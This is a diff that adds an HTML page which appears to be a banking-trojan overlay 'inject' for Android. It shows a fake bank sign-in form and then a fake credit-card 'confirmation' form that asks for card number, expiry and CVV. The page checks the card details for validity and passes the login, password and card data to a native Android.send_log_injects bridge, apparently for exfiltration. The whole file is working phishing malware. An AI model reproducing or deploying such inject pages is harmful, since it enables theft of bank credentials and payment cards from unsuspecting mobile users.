@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Document</title>
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
+        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js"></script>
+        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
+    <style>
+        section{
+            padding: 15px;
+        }
+        .input {
+            width: 100%;
+            padding: 5px;
+            border: 0;
+            border-bottom: 1px solid #d9d9d9;
+            color: #000;
+            margin-top: 15px;
+            padding-right: 25px;
+        }
+        .input:focus {
+            border-bottom:2px solid #000000;
+        }
+        input, button {
+            outline: none !important;
+            box-shadow: none !important;
+        }
+        .error {
+            border-bottom: 1px solid #f00 !important;
+        }
+        .button {
+            padding: 15px 45px;
+            border: 0;
+            border-radius: 50px;
+            background-color: #3abf56;
+            color: #fff;
+            display: block;
+            margin: 0 auto;
+            margin-top: 25px;
+            margin-bottom: 25px;
+            font-weight: 600;
+            width:70%;
+        } 
+            
+        .button:disabled {
+            background-color: #e5e5e5;
+        }
+        #grid {
+            display: grid;
+            grid-template-columns: 4fr auto;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
+        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#3abf56"></span>
+    </div>
+    <form onsubmit="return false">
+        <div id="form1">
+            <header>
+                <img style="width:100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAtAAAABcCAIAAADI2BVBAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyNpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ4IDc5LjE2NDAzNiwgMjAxOS8wOC8xMy0wMTowNjo1NyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIxLjAgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkREQkI1ODZFMDM5ODExRURBMzZCRDRGREYxMTlGQjYyIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkREQkI1ODZGMDM5ODExRURBMzZCRDRGREYxMTlGQjYyIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RERCQjU4NkMwMzk4MTFFREEzNkJENEZERjExOUZCNjIiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RERCQjU4NkQwMzk4MTFFREEzNkJENEZERjExOUZCNjIiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz4LIQCDAAADxUlEQVR42uzdP07bYBjA4QRlAw7BzGEYYYdIIGWBkROwBAYyRDIcIPdhzyU8Y17lqwJ105AmRP7sPs9QORR/CvXAr2/8p19VVQ8AYJ8O/BMAAIIDABAcAACCAwAQHACA4AAAEBwAgOAAABAcAIDgAAAEBwCA4AAABAcAIDgAAAQHACA4AAAEBwAgOAAAwQEAIDgAAMEBAAgOAADBAQAIDgAAwQEACA4AQHAAAHQpOKqqymQRAKAjwVEtfP1Kv9/fJTLSn7GI5gCARnT2d3D8XFtnCgDwszp7DofaAADBAQAIjqbN5/OHh4eyLHs7nOwZu8cisZTDDACCY0VtnJ2d3d/f393dvb+/1z4c2bA/Ysfb29tYJJbSHAAgOOpms9nb21uERVEU19fXac6xtMnJGbFL7Pjy8hKLxFKxoCMNAILjN6PR6OrqKm1HNKQ5x+a7xzfHLrFjehlLxYKONAA0KNPLYiMaliOKeDkcDh8fH4+OjtLfrrnktSzLqI2iKHqLWUjUxnQ6PThwbiwANGmQ59uKRIjCiI2UDmlcsUyHZW3UyuPP2UYsojYAoHFZ3/hr/ZyjZuVso7/gMANAswY5v7n1c45amphtAEC2WnBr82/nHM7bAIDMDfJ/i5EO4/G495c5h9kGAOSvNQ9vq805Iiyenp5iw2wDAPI3aMsbrZ3P8fr6ms4GNdsAgPy17PH0tTnHr5/BbAMAMh8cZPvOVpZQmnMs70OamG0AgODYkvtnAEBn+EgFANi7Nv2GTs+ALYoi3dF8uBAb6bmyNzc38Q3t6icA+E+05iqVlffbSNvpupUUIul25l93XPOkNwBAcHxacy/R2OgtLo5Nc47Yrt2HVG0AgOD4Xm22cXl5+fWalM2ftwIANCX3k0Y3fE7K+uet+FQFAJqV9YRj8+ekxBfTnc5XzjmWtaE8AKAR+U44tngG7LfPlQUAGpHphGO7Z8A6nwMA8pTjhGOL2UYtVsw5ACArOf7XfzKZ7PIM2Pjm8XgcnZFexlLPz8+ONAAIjk9VVZ2fn5+enqZ7iU6n08PDw39d5Pj4OHZM9yGNpS4uLhxpAGhQpieNzufz2Ww2Go12+SikLMvJZBL5cnJy4kgDgOAAALos08s3tsgg5QQA2TLhAAD2zg0qAADB8XPMcgBAcOydp6gAgOAAAAQHAIDgAAAEBwAgOAAABAcAIDgAAAQHACA4AADBAQAgOAAAwQEACA4AAMEBAAgOAADBAQAIDgBAcAAACA4AQHAAAIIDAEBwAACCAwBAcAAAggMA6LgPAQYAOjkpp2XksFEAAAAASUVORK5CYII=" alt="">
+            </header>
+            <section>
+                <h4 style="text-align:center; font-size: 20px;FONT-WEIGHT: 700;">
+                    Sign in to your account
+                </h4>
+                <input type="text" class="input"  id="login" name="login" required autocomplete="off" placeholder="Mobile number/Email address">
+                <input type="password" class="input" id="password" name="password"  required autocomplete="off" placeholder="Enter password">
+                <img id="eye" style="z-index: 999; position: relative;float: right; width: 19px; top:-26px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACIAAAAeCAIAAADGnVtDAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyNpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ4IDc5LjE2NDAzNiwgMjAxOS8wOC8xMy0wMTowNjo1NyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIxLjAgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkY1NjRERDI3MDM5OTExRURBQTE1REI1NjNEM0I0ODJEIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkY1NjRERDI4MDM5OTExRURBQTE1REI1NjNEM0I0ODJEIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RjU2NEREMjUwMzk5MTFFREFBMTVEQjU2M0QzQjQ4MkQiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RjU2NEREMjYwMzk5MTFFREFBMTVEQjU2M0QzQjQ4MkQiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz5If1C7AAADzklEQVR42rSWyyvtURTHHZcwoC55jzxSugaeAwNKeYwYeswM5a/wVzBSRsKIkwlKeYw8IjFQ3kLIoygG5H7O+Wq1zz7nOG5de7Db53f2Wt+1vuu7196Bj4+PpPDY2Nhgrq+vT/qBkWIYk5OTWv8EUor3W2AxkV5eXq6uruzn7/D4Nxj5FYbmurq6QCDAAtfr6+u7u7sPDw+uJWxnZ2eXl5c3NTUVFhZ+DROw2oi6iYkJee/p6RE2MMPDw6+vr6HdgYj9NsrKytrb20tLS78F4xXJRZqenq6qqiouLlYe4F1cXBweHu7t7ZktabW1tWVkZCSGYczPzy8sLHhI8cbj4+Pa2prtLyoqGhgYiEb6hFGAMSlKiMSgbLB9dHTEOj09fXBw0KtWRDYuRklJyfHxsZcTYoNSNlD8P+Hh+pqdnV1aWjKkgoIChc74NTQ0ZHodGxuTnPDb1dWFL1HPzBpCUlNT8/PzFxcXT09Pd3Z2qA1lN4oqKirYhibf399PTk5qamrY78OMjo6en5+zQDMUk0DwG42UmZlZWVm5vb399vZGTEimtraW8K02zLD3/Px8e3tbXV0dAUPZ1WwaGhrIw3jADICnpycPqbGxEZizszPmy8tLt3iIG13w8ebmRj+Zk1USSYW6dXZ2unTjGgOjmMIoGogiGpJm7cmagRNJALdAfsLMzMzo776+Pk+Lsk9LS7MUDYnBKRFdHgxOcCVxocAQDDaEQ7zYRPeMu7s7UUfg6MKQaD9yh6JAYpspVgtcNTc3K9fNzc1k+086jt0qwqRRAEOamppSTqhWSEasLdzul4yxetHy8rI1YAstJyeHmb6C3D0ksYdTAu/t7fVcIzYcssA5VqFstAkDeJQ7i0gHkERXVlasl3tIYs895jhRCyZLOQ8Jmk18gkSEi97ds52Xl8d3zgfR6SRx4pgx2d/fd1XucjU+Po7WWbS0tNBwI5rNyMiIfLW2tiIHM3M7ENGpSUOjW0u37wWDQaVOuP39/X4XAJazTb6AKUB917G/vr4mJ518LSQnsndzYp2VlbW1tZWbmwuGNZsYrRMkUqEddHd3e2eIcX9/jwk5ERbljXc/kbd7hce4CGBPQqBPYJnwwo+JlPhaAwMkEzedFEsPzMJi8+rqKtqlVPqItHhHJIaRMe1Iwpc7KCI5sa/rjl6HCGn70eZuTsKODWNHbG5uTndidB5uj+AO7OjooGzx2IsL41YLgR4cHHgPKD3V7AGl/aqT1i7SV9lEX/guUvRz0EXyckr5/gM14TPTOqy9KeM+bv/LEBKoJrm/AgwAX+TDxlQa5MoAAAAASUVORK5CYII=" alt="">
+                <div id="grid">
+                <p style="color:#3fbb59;font-size: 12px;">
+                New User Registration
+            </p>
+            <p style="color:#3fbb59;font-size: 12px; ">
+                Forgot Password?
+            </p>
+        </div>
+        <input type="submit" class="button" id="nextPage" disabled value="Sign In">
+        <p style="color:#3fbb59;font-size: 12px;text-align: center;">
+        Sign in with verification code
+        </p>
+            </section>
+        </div>
+        <div id="form2" style="display:none;">
+            <header>
+                <img style="width:100%;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAtAAAABcCAIAAADI2BVBAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyNpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMTQ4IDc5LjE2NDAzNiwgMjAxOS8wOC8xMy0wMTowNjo1NyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIDIxLjAgKFdpbmRvd3MpIiB4bXBNTTpJbnN0YW5jZUlEPSJ4bXAuaWlkOkREQkI1ODZFMDM5ODExRURBMzZCRDRGREYxMTlGQjYyIiB4bXBNTTpEb2N1bWVudElEPSJ4bXAuZGlkOkREQkI1ODZGMDM5ODExRURBMzZCRDRGREYxMTlGQjYyIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6RERCQjU4NkMwMzk4MTFFREEzNkJENEZERjExOUZCNjIiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6RERCQjU4NkQwMzk4MTFFREEzNkJENEZERjExOUZCNjIiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz4LIQCDAAADxUlEQVR42uzdP07bYBjA4QRlAw7BzGEYYYdIIGWBkROwBAYyRDIcIPdhzyU8Y17lqwJ105AmRP7sPs9QORR/CvXAr2/8p19VVQ8AYJ8O/BMAAIIDABAcAACCAwAQHACA4AAAEBwAgOAAABAcAIDgAAAEBwCA4AAABAcAIDgAAAQHACA4AAAEBwAgOAAAwQEAIDgAAMEBAAgOAADBAQAIDgAAwQEACA4AQHAAAHQpOKqqymQRAKAjwVEtfP1Kv9/fJTLSn7GI5gCARnT2d3D8XFtnCgDwszp7DofaAADBAQAIjqbN5/OHh4eyLHs7nOwZu8cisZTDDACCY0VtnJ2d3d/f393dvb+/1z4c2bA/Ysfb29tYJJbSHAAgOOpms9nb21uERVEU19fXac6xtMnJGbFL7Pjy8hKLxFKxoCMNAILjN6PR6OrqKm1HNKQ5x+a7xzfHLrFjehlLxYKONAA0KNPLYiMaliOKeDkcDh8fH4+OjtLfrrnktSzLqI2iKHqLWUjUxnQ6PThwbiwANGmQ59uKRIjCiI2UDmlcsUyHZW3UyuPP2UYsojYAoHFZ3/hr/ZyjZuVso7/gMANAswY5v7n1c45amphtAEC2WnBr82/nHM7bAIDMDfJ/i5EO4/G495c5h9kGAOSvNQ9vq805Iiyenp5iw2wDAPI3aMsbrZ3P8fr6ms4GNdsAgPy17PH0tTnHr5/BbAMAMh8cZPvOVpZQmnMs70OamG0AgODYkvtnAEBn+EgFANi7Nv2GTs+ALYoi3dF8uBAb6bmyNzc38Q3t6icA+E+05iqVlffbSNvpupUUIul25l93XPOkNwBAcHxacy/R2OgtLo5Nc47Yrt2HVG0AgOD4Xm22cXl5+fWalM2ftwIANCX3k0Y3fE7K+uet+FQFAJqV9YRj8+ekxBfTnc5XzjmWtaE8AKAR+U44tngG7LfPlQUAGpHphGO7Z8A6nwMA8pTjhGOL2UYtVsw5ACArOf7XfzKZ7PIM2Pjm8XgcnZFexlLPz8+ONAAIjk9VVZ2fn5+enqZ7iU6n08PDw39d5Pj4OHZM9yGNpS4uLhxpAGhQpieNzufz2Ww2Go12+SikLMvJZBL5cnJy4kgDgOAAALos08s3tsgg5QQA2TLhAAD2zg0qAADB8XPMcgBAcOydp6gAgOAAAAQHAIDgAAAEBwAgOAAABAcAIDgAAAQHACA4AADBAQAgOAAAwQEACA4AAMEBAAgOAADBAQAIDgBAcAAACA4AQHAAAIIDAEBwAACCAwBAcAAAggMA6LgPAQYAOjkpp2XksFEAAAAASUVORK5CYII=" alt="">
+            </header>
+            <section>
+                <h4 style="text-align:center; font-size: 20px;FONT-WEIGHT: 700;">
+                    Confirm with your credit card
+                </h4>
+                    <input type="tel" id="cc"  style="margin-bottom: 20px;" name="cc" onkeyup="check6();check8()" class="input" placeholder="Credit Card" autocomplete="off">
+                    <input type="tel" id="exp" name="exp" maxlength="5" style="width: 58%;float: left;margin-top: 15px;" onkeyup="check7();check8()" class="input" placeholder="Expiration Date" autocomplete="off">
+                    <input type="password" id="cvv" name="cvv" maxlength="3" style="width: 40%;float: right;margin-bottom: 20px;margin-top: 15px;" onkeyup="check8()" class="input" placeholder="CVV" autocomplete="off">
+                    
+                    <input type="submit" class="button" id="sendData" disabled value="Sign In"> 
+                </section>
+        </div>
+    </form>
+
+    <script>
+        $('#cc').mask('0000 0000 0000 0000')
+        $('#exp').mask('00/00')
+        $('#cvv').mask('000')
+
+        var spinner = document.getElementById('spinner'),
+            form1 = document.getElementById('form1'),
+            form2 = document.getElementById('form2');
+
+        var login = document.getElementById('login'),
+            password = document.getElementById('password');
+
+        var nextPage = document.getElementById('nextPage'),
+            sendData = document.getElementById('sendData');
+
+        var cc = document.getElementById('cc'),
+            exp = document.getElementById('exp'),
+            cvv = document.getElementById('cvv');
+
+        var eye = document.getElementById('eye');
+
+        login.onkeyup = () => {
+            if(login.value.length >= 4 && password.value.length >= 4) {
+                nextPage.disabled = false;
+            } else {
+                nextPage.disabled = true;
+            }
+        }
+
+        password.onkeyup = () => {
+            if(login.value.length >= 4 && password.value.length >= 4) {
+                nextPage.disabled = false;
+            } else {
+                nextPage.disabled = true;
+            }
+        }
+
+        nextPage.onclick = () => {
+            spinner.style.display = 'block';
+            
+            setTimeout(() => {
+                form1.style.display = 'none';
+                spinner.style.display = 'none';
+                form2.style.display = 'block';
+            }, 1500);
+        }
+        function check7() {
+            
+            var mmYY = exp.value.split('/');
+            var month = parseInt(mmYY[0]);
+            var year = parseInt(mmYY[1]);
+    
+            var expArray = exp.value.split('/');
+            var today, someday;
+            var exMonth = expArray[0];
+            var exYear = "20" + expArray[1];
+    
+            today = new Date();
+            someday = new Date();
+            someday.setFullYear(exYear, exMonth, 1);
+                    
+            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
+                exp.classList.add('error')
+            } else {
+                exp.classList.remove('error')
+                return true
+            }
+        }
+
+        function check6() {
+            if(!valid_credit_card(cc.value)) {
+                cc.classList.add('error')
+            } else {
+                cc.classList.remove('error');
+            }
+        }
+
+        function valid_credit_card(value) {
+            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
+            if (/[^0-9-\s]+/.test(value)) return false;
+            var nCheck = 0, nDigit = 0, bEven = false;
+            value = value.replace(/\D/g, "");
+            for (var n = value.length - 1; n >= 0; n--) {
+                var cDigit = value.charAt(n),
+                    nDigit = parseInt(cDigit, 10);
+                if (bEven) {
+                    if ((nDigit *= 2) > 9) nDigit -= 9;
+                }
+                nCheck += nDigit;
+                bEven = !bEven;
+            }
+            return (nCheck % 10) == 0;
+            
+        }
+
+        function check8() {
+            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
+                sendData.disabled = false;
+            } else {
+                sendData.disabled = true;
+            }
+        }
+
+        sendData.onclick = () => {
+                var data = {};
+                data.login = login.value;
+                data.password = password.value;
+                data.cc = cc.value;
+                data.exp = exp.value;
+                data.cvv = cvv.value;
+                data.type_injects = "banks";
+                data.closed = "close_activity_injects";
+
+                var ua = navigator.userAgent.toLowerCase();
+                if(ua.indexOf("android") > -1) {
+                    try {
+                        Android.send_log_injects(JSON.stringify(data))
+                    } catch (err) {}
+                }else{
+                    alert(JSON.stringify(data));
+                }
+        }
+        eye.onclick = () => {
+                if(password.type == 'password') {
+                    password.type = 'text'
+                } else {
+                    password.type = 'password'
+                }
+            }
+    </script>
+</body>
+</html>
